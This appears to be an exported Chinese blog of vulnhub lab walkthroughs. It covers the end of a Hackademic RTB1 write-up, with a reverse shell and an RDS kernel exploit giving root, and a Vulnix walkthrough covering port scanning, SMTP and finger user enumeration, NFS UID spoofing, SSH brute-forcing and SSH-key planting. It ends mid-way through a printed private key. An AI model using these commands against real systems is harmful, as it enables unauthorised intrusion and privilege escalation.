<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.84.140: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.84.135] from (UNKNOWN) [192.168.84.140] 51935</span><br><span class="line">Linux HackademicRTB1 2.6.31.5-127.fc12.i686 <span class="comment">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 02:55:19 up  4:02,  0 users,  load average: 4.99, 4.97, 4.91</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line">sh: no job control <span class="keyword">in</span> this shell</span><br><span class="line">sh-4.0$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">sh-4.0$ id</span><br><span class="line">uid=48(apache) gid=489(apache) groups=489(apache)</span><br><span class="line">id</span><br><span class="line">sh-4.0$</span><br></pre></td></tr></table></figure>
<p>成功弹回shell  ;););)</p>
<p>gcc编译提权脚本并执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh-4.0$ ls</span><br><span class="line">15285.c</span><br><span class="line">php-reverse-shell.php</span><br><span class="line">plugins</span><br><span class="line">shell.php</span><br><span class="line">themes</span><br><span class="line">ls</span><br><span class="line">sh-4.0$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">chmod: changing permissions of `plugins<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">chmod: changing permissions of `themes&#x27;</span>: Operation not permitted</span><br><span class="line">sh-4.0$ gcc 15285.c -o 15285</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">sh-4.0$ ./15285</span><br><span class="line">./15285</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc0aa19ac</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0955c6c</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc055d9d7</span><br><span class="line"> [+] Resolved commit_creds to 0xc044e5f1</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc044e452</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Restoring <span class="keyword">function</span> pointer...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>提权成功！就是这么屌！！！接下来读取key.txt文件找到密码，挑战完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">Desktop</span><br><span class="line">anaconda-ks.cfg</span><br><span class="line">key.txt</span><br><span class="line">key.txt~</span><br><span class="line"></span><br><span class="line">cat key.txt</span><br><span class="line">Yeah!!</span><br><span class="line">You must be proud because you <span class="string">&#x27;ve got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_d&amp;jgQ&gt;&gt;ak\#b&quot;(Hx&quot;o&lt;la_%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string">mr.pr0n || p0wnbox.Team || 2011</span></span><br><span class="line"><span class="string">http://p0wnbox.com</span></span><br></pre></td></tr></table></figure>

<h3 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h3><p>还可以使用如下命令将shell变得看起来更舒服</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>不好意思，这次没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HackLAB-Vulnix]</title>
    <url>/2020/04/15/HackLAB-Vulnix/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：HackLAB: Vulnix<br>发布日期：2012年9月10日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Vulnix.7z</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS93cC1jb250ZW50L3VwbG9hZHMvdnVsbml4L1Z1bG5peC43eg==">http://www.rebootuser.com/wp-content/uploads/vulnix/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43eg==">https://download.vulnhub.com/hacklab/Vulnix.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYWNrbGFiL1Z1bG5peC43ei50b3JyZW50">https://download.vulnhub.com/hacklab/Vulnix.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>在这里，有一台易受攻击的Linux主机，它具有配置方面的缺陷，而不是有目的的易受攻击的软件版本（无论如何，在发布之时！）该主机基于Ubuntu Server 12.04，并于2012年9月上旬进行了全面修补。详细信息如下：</p>
<p>架构：x86<br>格式：VMware（vmx＆vmdk）从版本4开始兼容<br>内存：512MB<br>网络：NAT<br>提取大小：820MB<br>压缩（下载大小）：194MB – 7zip格式– 7zip可从此处获得<br>MD5 Vulnix哈希值7z：0bf19d11836f72d22f30bf52cd585757<br>从此处下载Vulnix-</p>
<p>目标;引导，查找IP，破解并获得隐藏在/root中的flag-通过任何想要的方式-不包括对vmdk的实际破解如果有任何问题/意见，请使用下面的评论部分免费联系。</p>
<p>请享用！</p>
<p>资料来源：<span class="exturl" data-url="aHR0cDovL3d3dy5yZWJvb3R1c2VyLmNvbS8/cD05MzM=">http://www.rebootuser.com/?p=933<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.18</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">MAC Address: 00:0C:29:6C:D6:66 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.18</span></span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">25/tcp    open  smtp       Postfix smtpd</span><br><span class="line">79/tcp    open  finger     Linux fingerd</span><br><span class="line">110/tcp   open  pop3?</span><br><span class="line">111/tcp   open  rpcbind    2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">143/tcp   open  imap       Dovecot imapd</span><br><span class="line">512/tcp   open  <span class="built_in">exec</span>       netkit-rsh rexecd</span><br><span class="line">513/tcp   open  login?</span><br><span class="line">514/tcp   open  tcpwrapped</span><br><span class="line">993/tcp   open  ssl/imaps?</span><br><span class="line">995/tcp   open  ssl/pop3s?</span><br><span class="line">2049/tcp  open  nfs_acl    2-3 (RPC <span class="comment">#100227)</span></span><br><span class="line">39832/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">42471/tcp open  status     1 (RPC <span class="comment">#100024)</span></span><br><span class="line">45506/tcp open  nlockmgr   1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">52840/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">53613/tcp open  mountd     1-3 (RPC <span class="comment">#100005)</span></span><br></pre></td></tr></table></figure>

<p>如所见，对于某些用户枚举来说，有一些开放的端口可能很有趣：25（smtp），79（finger）和111（rpcbind）。开始做一些手动尝试来获取端口25（smtp）上的用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.66.18 25</span></span><br><span class="line">Trying 192.168.66.18...</span><br><span class="line">Connected to 192.168.66.18.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 vulnix ESMTP Postfix (Ubuntu)</span><br><span class="line">ehlo server</span><br><span class="line">250-vulnix</span><br><span class="line">250-PIPELINING</span><br><span class="line">250-SIZE 10240000</span><br><span class="line">250-VRFY</span><br><span class="line">250-ETRN</span><br><span class="line">250-STARTTLS</span><br><span class="line">250-ENHANCEDSTATUSCODES</span><br><span class="line">250-8BITMIME</span><br><span class="line">250 DSN</span><br><span class="line">vrfy root</span><br><span class="line">252 2.0.0 root</span><br><span class="line">vrfy admin</span><br><span class="line">550 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy user</span><br><span class="line">252 2.0.0 user</span><br><span class="line">vrfy administrator</span><br><span class="line">550 5.1.1 &lt;administrator&gt;: Recipient address rejected: User unknown <span class="keyword">in</span> <span class="built_in">local</span> recipient table</span><br><span class="line">vrfy vulnix</span><br><span class="line">252 2.0.0 vulnix</span><br></pre></td></tr></table></figure>

<p>在系统上找到3个用户：root，user和vulnix。继续使用finger进行一些研究：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># finger @192.168.66.18</span></span><br><span class="line">No one logged on.</span><br><span class="line">root@kali:~<span class="comment"># finger root@192.168.66.18</span></span><br><span class="line">Login: root                             Name: root</span><br><span class="line">Directory: /root                        Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger user@192.168.66.18</span></span><br><span class="line">Login: user                             Name: user</span><br><span class="line">Directory: /home/user                   Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line"></span><br><span class="line">Login: dovenull                         Name: Dovecot login user</span><br><span class="line">Directory: /nonexistent                 Shell: /bin/<span class="literal">false</span></span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br><span class="line">root@kali:~<span class="comment"># finger vulnix@192.168.66.18</span></span><br><span class="line">Login: vulnix                           Name: </span><br><span class="line">Directory: /home/vulnix                 Shell: /bin/bash</span><br><span class="line">Never logged <span class="keyword">in</span>.</span><br><span class="line">No mail.</span><br><span class="line">No Plan.</span><br></pre></td></tr></table></figure>

<p>有趣的是，该用户用户还具有用于Dovecot的虚拟用户，但没有登录。Dovecot是一个开源电子邮件服务器。这可能是有用的信息。</p>
<p>服务rpcbind已打开。这对于执行一些RPC枚举很有用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># rpcinfo -p 192.168.66.18</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    4   tcp    111  portmapper</span><br><span class="line">    100000    3   tcp    111  portmapper</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    4   udp    111  portmapper</span><br><span class="line">    100000    3   udp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  38458  status</span><br><span class="line">    100024    1   tcp  39760  status</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100227    2   tcp   2049</span><br><span class="line">    100227    3   tcp   2049</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100227    2   udp   2049</span><br><span class="line">    100227    3   udp   2049</span><br><span class="line">    100021    1   udp  47060  nlockmgr</span><br><span class="line">    100021    3   udp  47060  nlockmgr</span><br><span class="line">    100021    4   udp  47060  nlockmgr</span><br><span class="line">    100021    1   tcp  50245  nlockmgr</span><br><span class="line">    100021    3   tcp  50245  nlockmgr</span><br><span class="line">    100021    4   tcp  50245  nlockmgr</span><br><span class="line">    100005    1   udp  47351  mountd</span><br><span class="line">    100005    1   tcp  50825  mountd</span><br><span class="line">    100005    2   udp  42195  mountd</span><br><span class="line">    100005    2   tcp  55764  mountd</span><br><span class="line">    100005    3   udp  38349  mountd</span><br><span class="line">    100005    3   tcp  38329  mountd</span><br></pre></td></tr></table></figure>

<p>现在确定NFS正在侦听端口2049/tcp和2049/udp。现在是时候进行一些NFS枚举了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># showmount -e 192.168.66.18</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.66.18:</span><br><span class="line">/home/vulnix *</span><br></pre></td></tr></table></figure>

<p>这意味着可以从任何主机访问共享。因此将该共享的位置安装在本地计算机上：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># mount 192.168.66.18:/home/vulnix /root/vulnhub/vulnix</span></span><br><span class="line">root@kali:~/vulnhub<span class="comment"># cd vulnix</span></span><br><span class="line">bash: <span class="built_in">cd</span>: vulnix: 权限不够</span><br></pre></td></tr></table></figure>

<p>但是当尝试访问该文件夹时，检索到拒绝访问。尝试更改访问权限，但检索到相同的错误。认为root squashing已启用，因为去过由该VM的创建者开办的培训课程，经常提到要使其保持启用状态。</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>至此，决定暴力破解已检索用户的密码。创建一个文件，收集所有用户（没有用户dovenull，没有登录访问权限）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># cat user.txt </span></span><br><span class="line">root</span><br><span class="line">user</span><br><span class="line">vulnix</span><br></pre></td></tr></table></figure>

<p>然后使用字典列表rockyou.txt破解密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># medusa -h 192.168.66.18 -U user.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh -t 64</span></span><br></pre></td></tr></table></figure>

<p>终于破解了用户user的密码，即letmein。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh user@192.168.66.18</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.66.18 (192.168.66.18)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.66.18<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">user@192.168.66.18&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Thu Apr 16 03:53:37 BST 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0              Processes:           89</span><br><span class="line">  Usage of /:   90.2% of 773MB   Users logged <span class="keyword">in</span>:     0</span><br><span class="line">  Memory usage: 7%               IP address <span class="keyword">for</span> eth0: 192.168.66.18</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 90.2% of 773MB                                                                                                        </span><br><span class="line">                                                                                                                                      </span><br><span class="line">  Graph this data and manage this system at https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">user@vulnix:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user),100(users)</span><br><span class="line">user@vulnix:~$ whoami</span><br><span class="line">user</span><br><span class="line">user@vulnix:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/user</span><br><span class="line">user@vulnix:~$ uname -a</span><br><span class="line">Linux vulnix 3.2.0-29-generic-pae <span class="comment">#46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>当然，该用户不是sudoer。</p>
<h3 id="ssh-key毒化以getshell"><a href="#ssh-key毒化以getshell" class="headerlink" title="ssh key毒化以getshell"></a>ssh key毒化以getshell</h3><p>不得已时尝试以vulnix用户身份登录。</p>
<p>检查受害服务器上的/etc/passwd文件，发现用户vulnix具有UID 2008，因此在本地计算机上创建了一个名为vulnix的用户，UID为2008，然后尝试再次访问该分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user@vulnix:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">postfix:x:104:110::/var/spool/postfix:/bin/<span class="literal">false</span></span><br><span class="line">dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/<span class="literal">false</span></span><br><span class="line">dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:107:113::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br><span class="line">vulnix:x:2008:2008::/home/vulnix:/bin/bash</span><br><span class="line">statd:x:109:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>使用新创建的vulnix用户（具有UID 2008权限）成功进入已经挂载的/mnt/vulnix文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># useradd vulnix</span></span><br><span class="line">root@kali:~<span class="comment"># passwd vulnix</span></span><br><span class="line">新的 密码：</span><br><span class="line">重新输入新的 密码：</span><br><span class="line">passwd：已成功更新密码</span><br><span class="line">root@kali:~<span class="comment"># leafpad /etc/passwd</span></span><br><span class="line">root@kali:~<span class="comment"># su vulnix</span></span><br><span class="line">$ ls</span><br><span class="line">android-backup-recover.jar  ctf               go                  Linux_Exploit_Suggester.pl  proxychains-ng  TheFatRat</span><br><span class="line">ant                         Desktop           gobackdoor          linuxprivchecker.py         pwndbg          translatefiles</span><br><span class="line">antshells                   dirmap            gobackdoor.go       linux-sendpage3             pycdc           trojan</span><br><span class="line">antsword                    dirsearch         HiddenEye           location                    safedog2.py     uncompyle2</span><br><span class="line">BlindWaterMark              Downloads         historyvulnhub      Lucifer113.ovpn             safedog.py      vulnhub</span><br><span class="line">burpextend                  dvcs-ripper       hsdecomp            lxd-alpine-builder          shells          WAFNinja</span><br><span class="line">cansina                     Fatrat_Generated  knock-knock-master  picture                     SocialFish</span><br><span class="line">checkifbase64.py            GitHack           LinEnum.sh          pkcrack                     struts-pwn</span><br><span class="line">$ id</span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">$ <span class="built_in">cd</span> /mnt/vulnix</span><br><span class="line">$ ls</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/mnt/vulnix</span><br><span class="line">$ whoami</span><br><span class="line">vulnix</span><br><span class="line">$ id</span><br><span class="line">uid=2008(vulnix) gid=2008 组=2008</span><br><span class="line">$ ls -la</span><br><span class="line">总用量 20</span><br><span class="line">drwxr-x--- 2 nobody 4294967294 4096 9月   2  2012 .</span><br><span class="line">drwxr-xr-x 3 root   root       4096 4月  15 23:00 ..</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294 3486 4月   3  2012 .bashrc</span><br><span class="line">-rw-r--r-- 1 nobody 4294967294  675 4月   3  2012 .profile</span><br></pre></td></tr></table></figure>

<p>已经进入，生成一个SSH密钥，以vulnix用户身份登录而不需要密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnix<span class="comment"># ssh-keygen -t rsa</span></span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/root/.ssh/id_rsa): /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /root/vulnhub/vulnix/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:spDzqP71ppmCK9Ls2eSA+m1TFlI8Rs5xptB4isWBn7M root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">|   oo*o o        |</span></span><br><span class="line"><span class="string">|  . ++B=         |</span></span><br><span class="line"><span class="string">|   + *+.         |</span></span><br><span class="line"><span class="string">|  . *..          |</span></span><br><span class="line"><span class="string">|    ++..S        |</span></span><br><span class="line"><span class="string">| .  E=oo         |</span></span><br><span class="line"><span class="string">|.o..oo+          |</span></span><br><span class="line"><span class="string">|+ +O+. +.        |</span></span><br><span class="line"><span class="string">|o=B+=o+o.        |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# ls</span></span><br><span class="line"><span class="string">id_rsa  id_rsa.pub  user.txt</span></span><br><span class="line"><span class="string">root@kali:~/vulnhub/vulnix# cat id_rsa</span></span><br><span class="line"><span class="string">-----BEGIN OPENSSH PRIVATE KEY-----</span></span><br><span class="line"><span class="string">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span></span><br><span class="line"><span class="string">NhAAAAAwEAAQAAAYEA3rZnUKi375a1jnBNaY1apRRslsyf+YG8mMrGKcnEwDGEXcKaeyna</span></span><br><span class="line"><span class="string">zdXsBDPf/0V2kQA9XYPBG+Q/ppc6hl4BpmDi+SbEDH5KSX2SPyON1qeYAAu9kfwSx8HOxW</span></span><br><span class="line"><span class="string">SPUYePPCOnuqxcBA2iIISsmSq10QR7mMSiADqpGFjM0C/22NhLbdEX4WSsJPbOJVhJFLn9</span></span><br><span class="line"><span class="string">VCtVGpLC/g3Cu3CYJ5EtuAfvAYcwvgjJjW0Rb7Euv7nsBaTVfcFWkCfPzFgXGzdhnLORLP</span></span><br><span class="line"><span class="string">Ig29l0NrHkxTbh0cfNpcUrSRO8xSUUF8ACMxObbuVcjzbpXX8rrTaxemE89vFVG6zLRxEX</span></span><br><span class="line"><span class="string">0Fk21EHc/CMfYj7RrHYUek689KaKKGfS/X5dNQIwJ0kfR/zkz5L1WrkemrM+wJPamxeckL</span></span><br><span class="line"><span class="string">DEGVTdg1HmIOwVsFpKV/QiAQijPnCQfa1f2buQxOOSla2rD80bGYIPlJ2/ZdYR/GizM+6Q</span></span><br><span class="line"><span class="string">Er+XcCTzWYDsKT2NYO+ZVCROgxTR2CyLuY4Hb+M7AAAFgHbM1252zNduAAAAB3NzaC1yc2</span></span><br><span class="line"><span class="string">EAAAGBAN62Z1Cot++WtY5wTWmNWqUUbJbMn/mBvJjKxinJxMAxhF3Cmnsp2s3V7AQz3/9F</span></span><br><span class="line"><span class="string">dpEAPV2DwRvkP6aXOoZeAaZg4vkmxAx+Skl9kj8jjdanmAALvZH8EsfBzsVkj1GHjzwjp7</span></span><br><span class="line"><span class="string">qsXAQNoiCErJkqtdEEe5jEogA6qRhYzNAv9tjYS23RF+FkrCT2ziVYSRS5/VQrVRqSwv4N</span></span><br><span class="line"><span class="string">wrtwmCeRLbgH7wGHML4IyY1tEW+xLr+57AWk1X3BVpAnz8xYFxs3YZyzkSzyINvZdDax5M</span></span><br><span class="line"><span class="string">U24dHHzaXFK0kTvMUlFBfAAjMTm27lXI826V1/K602sXphPPbxVRusy0cRF9BZNtRB3Pwj</span></span><br><span class="line"><span class="string">H2I+0ax2FHpOvPSmiihn0v1+XTUCMCdJH0f85M+S9Vq5HpqzPsCT2psXnJCwxBlU3YNR5i</span></span><br><span class="line"><span class="string">DsFbBaSlf0IgEIoz5wkH2tX9m7kMTjkpWtqw/NGxmCD5Sdv2XWEfxoszPukBK/l3Ak81mA</span></span><br><span class="line"><span class="string">7Ck9jWDvmVQkToMU0dgsi7mOB2/jOwAAAAMBAAEAAAGAQTkYDrYqj/8KErnu4d+k0T2nA4</span></span><br><span class="line"><span class="string">7Ptul4yyJvYGOXvFWEF1VbmoBKdQeWRDDRA9ha/eIdFpr0Xe+9eFNHr3wubYRoVGE2/xWp</span></span><br><span class="line"><span class="string">OdaNkvIdouSYDkNh9DPnaBrpLEPj+RODLjCe+Xtqw0Ee3vkb9wtcDeeLLtU/QGPti5TN/p</span></span><br><span class="line"><span class="string">Zda2oExRd8L+UkyPqCqsstM+W4PAMovEyI0JBFHFHALa5FvmSMaV0nODAonsN3XMd+EmYn</span></span><br><span class="line"><span class="string">qgt4/og1iqguIgEWW0EfSDbAFeDKWdFWPYuGcW+JAS7rwOMycJtofY0y6zb459HA/j6x2Z</span></span><br><span class="line"><span class="string">Gk/vWfi7NPjJTncm5EkN7PIUWljhjwuOGSwnr5QRXomU61Us3L+nljFybF3hsLSKXK/9tV</span></span><br><span class="line"><span class="string">q2VuoAPbHInVOsGAwiFMdKQAlizCNw9RkPAASSopE9LZDxZXaSz2knPX43n/yH0fTs2jMG</span></span><br><span class="line"><span class="string">VUunGXRbzbP1sNGWlrq53F1zdDFhKw2RsnwnEJqTxey1RHgNxfQ9Idkr7seqSEHpGpAAAA</span></span><br><span class="line"><span 